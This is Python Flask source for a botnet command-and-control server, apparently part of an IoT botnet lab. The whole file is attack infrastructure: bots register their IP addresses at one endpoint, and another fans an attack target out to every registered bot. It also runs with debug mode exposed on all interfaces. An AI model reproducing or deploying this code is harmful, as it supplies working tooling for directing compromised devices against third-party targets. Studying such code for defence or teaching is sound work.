# cnc.py
from flask import Flask,request,jsonify, Response
import requests

REPORT_SERVER = "http://report:5000" 

app = Flask(__name__)

bots=[]

ATTACKER_USER = ""
ATTACKER_PASS = ""

@app.route("/bots")
def get_devices():
    return {"bots":bots}
    
# register iot devices
@app.route("/register", methods=["POST"])
def register():
    data = request.json
    bot_ip = data.get("ip")
    
    if bot_ip not in bots:
        bots.append(bot_ip)
        print(f"Bot registered: {bot_ip}", flush = True)
    
    return {"status":"ok"}
    

# attack
@app.route("/attack", methods=["POST"])
def launch_attack():
    devices = get_devices().get("bots",[])
    if not devices:
        return {"status": "no bots"}
    
    data = request.json
    target = data.get("target")
    results = []
    
    print(f"the target is {target}")
    print(f"Bots: {devices}")
    
    for d in devices:
        try:
            requests.post(f"http://{d}:8000/attack",json={"target": target})
            results.append({d:"ok"})
        except:
            results.append({d:"attack failed from the bot"})
    return results
    
    
app.run(host="0.0.0.0", port=5002,debug = True)


